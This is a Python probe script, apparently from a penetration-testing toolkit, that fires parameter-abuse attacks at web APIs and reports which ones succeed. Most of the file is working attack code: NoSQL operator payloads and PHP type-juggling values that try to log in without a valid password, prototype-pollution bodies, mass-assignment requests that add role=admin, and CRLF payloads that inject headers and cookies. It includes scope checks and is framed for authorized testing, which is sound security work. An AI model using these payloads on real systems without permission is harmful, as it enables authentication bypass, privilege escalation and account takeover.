#!/usr/bin/env python3
"""大爱仙尊参数滥用探针：NoSQL / 原型链 / 批量赋值 / CRLF / PHP 类型混淆。

对照基线，禁止把「接口本来就 200」写成注入。
SQL 走 sqlmap_kit；JWT claim 走 jwt_forge；RBAC 走 rbac_bypass。

示例:
  python3 炼蛊房/param_abuse_probe.py nosql --url https://授权/api/login --case <案>
  python3 炼蛊房/param_abuse_probe.py proto --url https://授权/api/settings --case <案>
  python3 炼蛊房/param_abuse_probe.py mass --url https://授权/api/user --base '{"name":"se"}' --extra role=admin --case <案>
  python3 炼蛊房/param_abuse_probe.py crlf --url 'https://授权/?next=x' --param next --case <案>
  python3 炼蛊房/param_abuse_probe.py juggl --url https://授权/api/login --case <案>
  python3 炼蛊房/param_abuse_probe.py --self-test
"""
from __future__ import annotations

import argparse
import json
import re
import sys
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

OPS = __import__("pathlib").Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))

from probe_http import get, post, session  # noqa: E402
from scope_lib import require_in_scope, write_probe_json  # noqa: E402

OKISH = re.compile(
    r'"token"\s*:|eyJ[A-Za-z0-9_-]{8,}\.|\"code\"\s*:\s*0\b|"success"\s*:\s*true|"role"\s*:\s*"(admin|root)"',
    re.I,
)
FAILISH = re.compile(r'"code"\s*:\s*([1-9]\d{2,}|-\d+)|invalid|unauthorized|forbidden|密码错误|登录失败', re.I)
PP_MARK = "se_pp9359"
CRLF_NAME = "X-SE-CRLF"
PLAY = {
    "nosql": "传承/无表.md",
    "proto": "传承/祖型污.md",
    "mass": "传承/群赋.md",
    "crlf": "传承/折行.md",
    "juggl": "传承/乱型.md",
}


def _h(headers: dict[str, str], name: str) -> str:
    want = name.lower()
    for k, v in (headers or {}).items():
        if str(k).lower() == want:
            return str(v)
    return ""


def with_param(url: str, name: str, value: str) -> str:
    u = urlparse(url)
    q = dict(parse_qsl(u.query, keep_blank_values=True))
    q[name] = value
    return urlunparse(u._replace(query=urlencode(q, safe="%:[]$")))


def better_than(base: dict[str, Any], probe: dict[str, Any]) -> bool:
    if probe.get("error") or probe.get("status") not in (200, 201, 204, 302):
        return False
    if base.get("status") in (200, 201) and abs(int(probe["len"]) - int(base["len"])) < 12 and probe.get("okish") == base.get("okish"):
        return False
    if probe.get("okish") and not base.get("okish"):
        return True
    if probe.get("status") in (200, 201, 302) and base.get("status") in (401, 403, 422):
        return True
    return False


def _fp(r: Any) -> dict[str, Any]:
    text = r.text or ""
    return {
        "status": r.status,
        "len": len(text),
        "okish": bool(OKISH.search(text)),
        "failish": bool(FAILISH.search(text)),
        "error": r.error or "",
    }


def nosql_payloads(user_f: str, pass_f: str) -> list[tuple[str, dict[str, Any]]]:
    return [
        ("ne", {user_f: {"$ne": ""}, pass_f: {"$ne": ""}}),
        ("gt", {user_f: {"$gt": ""}, pass_f: {"$gt": ""}}),
        ("regex", {user_f: {"$regex": ".*"}, pass_f: {"$regex": ".*"}}),
        ("nin", {user_f: {"$nin": []}, pass_f: {"$ne": None}}),
    ]


def probe_nosql(url: str, user_f: str, pass_f: str, extra: dict[str, str]) -> dict[str, Any]:
    require_in_scope(url)
    s = session()
    headers = {"Content-Type": "application/json", **extra}
    base_body = {user_f: "se_nosuch_user", pass_f: "se_wrong_pass"}
    base = _fp(post(url, sess=s, headers=headers, json=base_body, timeout=12))
    hits = []
    for name, body in nosql_payloads(user_f, pass_f):
        row = _fp(post(url, sess=s, headers=headers, json=body, timeout=12))
        hits.append({"kind": name, **row, "ok": better_than(base, row)})
    qurl = with_param(with_param(url, f"{user_f}[$ne]", ""), f"{pass_f}[$ne]", "")
    qrow = _fp(get(qurl, sess=s, headers=extra or None, timeout=12))
    hits.append({"kind": "qs-ne", **qrow, "ok": better_than(base, qrow)})
    return {"url": url, "base": base, "hits": hits, "l2": any(h["ok"] for h in hits), "playbook": PLAY["nosql"]}


def proto_hit(text: str) -> str:
    if re.search(rf'[{{,]\s*"{PP_MARK}"\s*:', text):
        return "L2"
    if PP_MARK in text:
        return "L1"
    return ""


def probe_proto(url: str, extra: dict[str, str]) -> dict[str, Any]:
    require_in_scope(url)
    s = session()
    headers = {"Content-Type": "application/json", **extra}
    bodies = (
        ("proto", { "__proto__": {PP_MARK: "1"} }),
        ("constructor", {"constructor": {"prototype": {PP_MARK: "1"}}}),
    )
    hits = []
    for name, body in bodies:
        r = post(url, sess=s, headers=headers, json=body, timeout=12)
        lvl = proto_hit(r.text or "")
        hits.append({"kind": name, "status": r.status, "level": lvl, "len": len(r.text or ""), "error": r.error or ""})
    gr = get(with_param(url, f"__proto__[{PP_MARK}]", "1"), sess=s, headers=extra or None, timeout=12)
    gl = proto_hit(gr.text or "")
    hits.append({"kind": "qs-proto", "status": gr.status, "level": gl, "len": len(gr.text or ""), "error": gr.error or ""})
    levels = {h["level"] for h in hits}
    return {"url": url, "hits": hits, "l2": "L2" in levels, "l1": bool(levels - {""}), "playbook": PLAY["proto"]}


def merge_extra(base: dict[str, Any], extra_fields: dict[str, str]) -> dict[str, Any]:
    out = dict(base)
    for k, v in extra_fields.items():
        if v.lower() in ("true", "false"):
            out[k] = v.lower() == "true"
        elif v.isdigit():
            out[k] = int(v)
        else:
            out[k] = v
    return out


def probe_mass(url: str, base_obj: dict[str, Any], extra_fields: dict[str, str], hdrs: dict[str, str]) -> dict[str, Any]:
    require_in_scope(url)
    s = session()
    headers = {"Content-Type": "application/json", **hdrs}
    base_r = post(url, sess=s, headers=headers, json=base_obj, timeout=12)
    forged = merge_extra(base_obj, extra_fields)
    probe_r = post(url, sess=s, headers=headers, json=forged, timeout=12)
    text = probe_r.text or ""
    echoed = [k for k in extra_fields if re.search(rf'"{re.escape(k)}"\s*:\s*{_json_val(extra_fields[k])}', text)]
    rec = {
        "url": url,
        "base": _fp(base_r),
        "probe": _fp(probe_r),
        "echoed": echoed,
        "l2": bool(echoed) or better_than(_fp(base_r), _fp(probe_r)),
        "playbook": PLAY["mass"],
        "note": "回显 extra 字段或登录态明显好于基线才算。改余额先问。",
    }
    return rec


def _json_val(v: str) -> str:
    if v.lower() in ("true", "false"):
        return v.lower()
    if v.isdigit():
        return v
    return '"' + re.escape(v) + '"'


def crlf_payloads() -> list[tuple[str, str]]:
    return [
        ("rn", "%0d%0a" + CRLF_NAME + ":1"),
        ("n", "%0a" + CRLF_NAME + ":1"),
        ("utf8", "%E5%98%8A%E5%98%8D" + CRLF_NAME + ":1"),
        ("cookie", "%0d%0aSet-Cookie:se_crlf=1"),
    ]


def probe_crlf(url: str, param: str, extra: dict[str, str]) -> dict[str, Any]:
    require_in_scope(url)
    s = session()
    hits = []
    for name, pay in crlf_payloads():
        r = get(with_param(url, param, pay), sess=s, headers=extra or None, timeout=12)
        inj = _h(r.headers, CRLF_NAME) == "1" or "se_crlf=1" in _h(r.headers, "Set-Cookie")
        hits.append({"kind": name, "status": r.status, "injected": inj, "error": r.error or ""})
    return {"url": url, "param": param, "hits": hits, "l2": any(h["injected"] for h in hits), "playbook": PLAY["crlf"]}


def juggl_payloads(user_f: str, pass_f: str, user: str) -> list[tuple[str, dict[str, Any]]]:
    return [
        ("true", {user_f: user, pass_f: True}),
        ("zero", {user_f: user, pass_f: 0}),
        ("arr", {user_f: user, pass_f: []}),
        ("0e", {user_f: user, pass_f: "0e123456"}),
    ]


def probe_juggl(url: str, user_f: str, pass_f: str, user: str, extra: dict[str, str]) -> dict[str, Any]:
    require_in_scope(url)
    s = session()
    headers = {"Content-Type": "application/json", **extra}
    base = _fp(post(url, sess=s, headers=headers, json={user_f: user, pass_f: "se_wrong_pass"}, timeout=12))
    hits = []
    for name, body in juggl_payloads(user_f, pass_f, user):
        row = _fp(post(url, sess=s, headers=headers, json=body, timeout=12))
        hits.append({"kind": name, **row, "ok": better_than(base, row)})
    return {"url": url, "base": base, "hits": hits, "l2": any(h["ok"] for h in hits), "playbook": PLAY["juggl"]}


def run_self_test() -> list[str]:
    fails: list[str] = []
    if not better_than({"status": 401, "len": 20, "okish": False}, {"status": 200, "len": 80, "okish": True, "error": ""}):
        fails.append("better")
    if better_than({"status": 200, "len": 40, "okish": False}, {"status": 200, "len": 42, "okish": False, "error": ""}):
        fails.append("same")
    if proto_hit('{"se_pp9359":"1"}') != "L2":
        fails.append("proto-key")
    if proto_hit("echo se_pp9359") != "L1":
        fails.append("proto-echo")
    if "username[$ne]" not in with_param("https://x.test/", "username[$ne]", ""):
        fails.append("qs")
    merged = merge_extra({"name": "a"}, {"role": "admin", "isAdmin": "true"})
    if merged.get("role") != "admin" or merged.get("isAdmin") is not True:
        fails.append("mass")
    if crlf_payloads()[0][1].count("%0d%0a") != 1:
        fails.append("crlf")
    if juggl_payloads("u", "p", "admin")[0][1]["p"] is not True:
        fails.append("juggl")
    return fails


def _headers(items: list[str]) -> dict[str, str]:
    out: dict[str, str] = {}
    for raw in items:
        if ":" not in raw:
            raise SystemExit(f"--header 要 Name: value：{raw}")
        k, v = raw.split(":", 1)
        out[k.strip()] = v.strip()
    return out


def _parse_kv(items: list[str]) -> dict[str, str]:
    out: dict[str, str] = {}
    for raw in items:
        if "=" not in raw:
            raise SystemExit(f"要 k=v：{raw}")
        k, v = raw.split("=", 1)
        out[k.strip()] = v.strip()
    return out


def _dump(data: dict[str, Any], case: str, name: str) -> int:
    path = write_probe_json(data, case=case, case_subdir="param_abuse", filename=f"{name}.json")
    slim = {k: data[k] for k in data if k != "playbook"}
    print(json.dumps({**slim, "out": str(path)}, ensure_ascii=False)[:2000])
    return 0 if data.get("l2") or data.get("l1") else 1


def main() -> int:
    ap = argparse.ArgumentParser(description="大爱仙尊 NoSQL/PP/Mass/CRLF/类型混淆")
    ap.add_argument("--self-test", action="store_true")
    sub = ap.add_subparsers(dest="cmd")

    def loginish(p: argparse.ArgumentParser) -> None:
        p.add_argument("--url", required=True)
        p.add_argument("--user-field", default="username")
        p.add_argument("--pass-field", default="password")
        p.add_argument("--header", action="append", default=[])
        p.add_argument("--case", default="")

    loginish(sub.add_parser("nosql"))
    p_p = sub.add_parser("proto")
    p_p.add_argument("--url", required=True)
    p_p.add_argument("--header", action="append", default=[])
    p_p.add_argument("--case", default="")
    p_m = sub.add_parser("mass")
    p_m.add_argument("--url", required=True)
    p_m.add_argument("--base", default="{}")
    p_m.add_argument("--extra", action="append", default=["role=admin"])
    p_m.add_argument("--header", action="append", default=[])
    p_m.add_argument("--case", default="")
    p_c = sub.add_parser("crlf")
    p_c.add_argument("--url", required=True)
    p_c.add_argument("--param", required=True)
    p_c.add_argument("--header", action="append", default=[])
    p_c.add_argument("--case", default="")
    p_j = sub.add_parser("juggl")
    loginish(p_j)
    p_j.add_argument("--user", default="admin")

    args = ap.parse_args()
    if args.self_test:
        fails = run_self_test()
        if fails:
            for f in fails:
                print(f"FAIL {f}")
            return 1
        print("self-test ok  param_abuse")
        return 0

    extra = _headers(getattr(args, "header", []) or [])
    if args.cmd == "nosql":
        return _dump(probe_nosql(args.url, args.user_field, args.pass_field, extra), args.case, "nosql")
    if args.cmd == "proto":
        return _dump(probe_proto(args.url, extra), args.case, "proto")
    if args.cmd == "mass":
        try:
            base_obj = json.loads(args.base)
        except json.JSONDecodeError as e:
            raise SystemExit(f"--base 要 JSON：{e}") from e
        if not isinstance(base_obj, dict):
            raise SystemExit("--base 要对象")
        return _dump(probe_mass(args.url, base_obj, _parse_kv(args.extra), extra), args.case, "mass")
    if args.cmd == "crlf":
        return _dump(probe_crlf(args.url, args.param, extra), args.case, "crlf")
    if args.cmd == "juggl":
        return _dump(probe_juggl(args.url, args.user_field, args.pass_field, args.user, extra), args.case, "juggl")
    ap.error("需要 nosql / proto / mass / crlf / juggl / --self-test")
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
